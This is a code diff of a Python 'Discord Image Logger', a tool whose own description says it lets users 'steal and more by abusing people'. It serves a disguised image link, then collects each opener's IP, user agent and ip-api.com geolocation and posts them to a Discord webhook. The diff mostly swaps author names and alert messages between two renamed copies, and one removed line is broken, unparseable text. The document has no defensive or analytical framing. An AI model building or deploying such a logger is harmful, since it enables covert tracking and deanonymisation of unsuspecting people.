@@ -5,10 +5,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Role giver"
-__description__ = "A simple application which allows you to give roles and more by abusing you."
-__version__ = "v2.1"
-__author__ = "Fellowyyy"
+__app__ = "Discord Image Loader"
+__description__ = "A simple application which allows you to steal and more by abusing people"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
@@ -18,7 +18,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "transgy", # Set this to the name you want the webhook to have
+    "username": "Restore", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,11 +28,11 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been loaded by Kaylee Park's security successfully! I LOVE YOU!", # Message to show
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 0, # Prevents VPNs from triggering the alert
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "=" # Link to the webpage to redirect to 
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -80,9 +80,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "touchmaster - Error",
+            "title": "Image Logger - Error",
             "color": config["color"],
-            "description": f"An error occurred while trying!\n\n**Error:**\n```\n{error}\n```",
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -99,15 +99,15 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": " - Link Sent",
             "color": config["color"],
-            "description": f"An **Loading!** link was sent in a chat!\nYou may receive an Airstrike soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **loading** link was sent in a chat!\nYou may receive an Airstrike soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@fellowyyy"
+    ping = "@everyone"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
@@ -144,9 +144,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Found! - Got em",
+            "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": mothafuckA User Opened the Original Image!**
+            "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
             
